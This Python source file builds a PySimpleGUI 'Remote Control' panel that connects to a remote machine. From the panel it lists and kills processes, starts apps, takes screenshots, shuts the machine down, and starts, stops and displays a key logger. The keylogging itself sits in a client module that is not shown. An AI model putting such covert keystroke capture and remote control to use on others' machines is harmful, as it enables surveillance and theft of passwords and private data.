from client import Client
from client import TMP_PATH
import os
import PySimpleGUI as sg

# GUI Layout
sg.theme("Dark Purple 4")
tab1_layout = [
  [sg.Button("View Processes")],
  [sg.Button("View Apps")],
  [sg.Button("Kill Process"), sg.Input(size=(20, 1))],
  [sg.Button("Start App"), sg.Input(size=(20, 1))],
]

tab2_layout = [
  [sg.Button("Start Key Logger")],
  [sg.Button("Stop Key Logger")],
  [sg.Button("Print Key Logger")],
]
tab3_layout = [[sg.Button("Take Screenshot")], [sg.Button("Shutdown")]]

# The TabgGroup layout - it must contain only Tabs
# tab_group_layout = [
#     [
#         sg.Tab("App & Processes", tab1_layout),
#         sg.Tab("Key Logger", tab2_layout),
#         sg.Tab("Other", tab3_layout),
#     ]

# ]

# First Frame
control_layout = [[sg.Frame('App & Processes', layout=tab1_layout)],
                  [sg.Frame('Key Logger', layout=tab2_layout)],
                  [sg.Frame('Other', layout=tab3_layout)]
                  ]

# Result Layout
output_layout = [[sg.Text("", size=(800, 300), key='OUTPUT')]]

# The window layout - defines the entire window
layout = [[sg.Column(control_layout, element_justification='c'),
           sg.Column(output_layout, element_justification='c',  scrollable=True,  vertical_scroll_only=True)]]

def main():
  client = Client()
  client.connect()
  window = sg.Window("Remote Control", layout, no_titlebar=False, size=(720, 480))

  while True:
    try:
      event, value = window.read()
      if event == "Exit" or event == sg.WIN_CLOSED:
        try:
          client.end_connection()
          break
        except Exception as e:
          print(f"[ERROR] {e}")
          break 

      elif event == "View Processes":
        window['OUTPUT'].Update('')
        results = client.view_processes()
        print(results)
        window['OUTPUT'].update(value=results)

      elif event == "View Apps":
        window['OUTPUT'].Update('')
        results = client.view_apps()
        print(results)
        window['OUTPUT'].update(value=results)

      elif event == "Kill Process":
        msg = client.kill_process(value[0])
        window['OUTPUT'].Update('')
        window['OUTPUT'].update(value=msg)

      elif event == "Start App":
        msg = client.start_app(value[1])
        window['OUTPUT'].update('')
        window['OUTPUT'].update(value=msg)

      elif event == "Start Key Logger":
        window['OUTPUT'].Update('')
        results = client.start_keylogger()
        window['OUTPUT'].update(value=results)

      elif event == "Stop Key Logger":
        window['OUTPUT'].Update('')
        results = client.stop_keylogger()
        window['OUTPUT'].update(value=results)

      elif event == "Print Key Logger":
        window['OUTPUT'].Update('')
        client.save_keylogger()
        results = ""
        with open (os.path.join(TMP_PATH, "keylogger.txt"), 'r') as f:
          results = f.read()
        window['OUTPUT'].update(value=results)

      elif event == "Take Screenshot":
        client.take_screenshot()

      elif event == "Shutdown":
        window['OUTPUT'].Update('')
        results = client.shutdown()
        window['OUTPUT'].update(value=results)

    except ConnectionResetError:
      window['OUTPUT'].update(value="Server disconnected")
    except ConnectionError:
      window['OUTPUT'].update(value="Server not found")
    except Exception as e:
      window['OUTPUT'].update(value="Something went wrong")
    
  window.close()

if __name__ == '__main__':
  main()
